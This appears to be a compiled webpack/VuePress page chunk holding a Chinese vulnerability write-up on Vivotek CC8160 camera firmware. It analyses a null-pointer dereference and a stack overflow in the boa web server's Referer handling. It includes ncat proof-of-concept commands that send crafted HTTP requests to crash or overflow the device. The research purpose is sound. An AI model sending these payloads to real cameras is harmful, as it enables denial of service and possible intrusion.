(window.webpackJsonp=window.webpackJsonp||[]).push([[6],{316:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-null.f03804d6.png"},317:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-null-gdb.cbe00033.png"},318:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-null-gdb2.ac90662b.png"},319:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-stack.6481d8b0.png"},320:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-stack-gdb1.108831c3.png"},321:function(t,s,a){t.exports=a.p+"assets/img/ida-vivotek-stack-gdb2.ac340952.png"},345:function(t,s,a){"use strict";a.r(s);var e=[function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"content"},[e("h2",{attrs:{id:"_0x1-版本信息"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x1-版本信息","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x1 版本信息")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("固件版本 CC8160-VVTK-0109a.flash\nboa: version 1.32.4.1\n")])])]),e("h2",{attrs:{id:"_0x2-strstr空指针引用"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x2-strstr空指针引用","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x2 strstr空指针引用")]),t._v(" "),e("p",[t._v("在0000AEC0函数，使用strstr处理http头信息时，没有判断参数(v4+100)是否为空，造成空指针引用。")]),t._v(" "),e("p",[e("img",{attrs:{src:a(316),alt:""}})]),t._v(" "),e("p",[t._v("poc:")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('echo -en "GET /cgi-bin/admin/upgrade.cgi HTTP/1.0\\nReferer:http://192.168.2.2:80/cgi-bin/admin/upgrade.cgi\\n\\r\\n\\r\\n"  | ncat -v 192.168.2.2 80\n')])])]),e("p",[t._v("当http头存在Referer字段时，程序会根据Host字段的值，使用strstr函数在Referer字符串中寻找主机ip字符串，也就是上图的v4+100。当http头信息中存在Referer，不存在host信息时，造成strstr第二个参数的地址为空，触发空指针引用。")]),t._v(" "),e("p",[e("img",{attrs:{src:a(317),alt:""}})]),t._v(" "),e("p",[e("img",{attrs:{src:a(318),alt:""}})]),t._v(" "),e("h2",{attrs:{id:"_0x3-strncpy栈溢出漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x3-strncpy栈溢出漏洞","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x3 strncpy栈溢出漏洞")]),t._v(" "),e("p",[t._v("在0000AEC0函数，提取http Referer链接的端口时，处理不当，造成了栈溢出漏洞。")]),t._v(" "),e("p",[t._v('图中sa变量为Referer的信息，程序首先用strstr函数判断Referer中是否存在“http://”字符串，如果存在，紧接着判断是否存在“：”字符，将字符串“http://”和“：”中间的内容，也就是ip或者url保存到栈变量dest中，此时增加了对提取信息的长度判断，不能大于0x7。然后判断字符串“：”后边是否存在"/"，如果存在字符"/"将字符“：”和字符“/”中的内容也就是端口信息，保存到栈变量s1中，此时没有对端口的长度进行验证，直接进行复制，可能造成了栈溢出。')]),t._v(" "),e("p",[t._v("构造Referer信息为：")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("http://1.0.0.1:800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000/aa/\n")])])]),e("p",[e("img",{attrs:{src:a(319),alt:""}})]),t._v(" "),e("p",[t._v("动态调试")]),t._v(" "),e("p",[e("img",{attrs:{src:a(320),alt:""}})]),t._v(" "),e("p",[t._v("poc")]),t._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v('echo -en "GET /cgi-bin/admin/upgrade.cgi HTTP/1.0\\nHost:19\\nReferer:http://1.0.0.1:1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111........../\\n\\r\\n\\r\\n"  | ncat -v 192.168.2.2 80\n')])])]),e("p",[t._v("向栈中拷贝0xbdc字节的数据")]),t._v(" "),e("p",[e("img",{attrs:{src:a(321),alt:""}})])])}],r=a(1),n=Object(r.a)({},function(){this.$createElement;this._self._c;return this._m(0)},e,!1,null,null,null);s.default=n.exports}}]);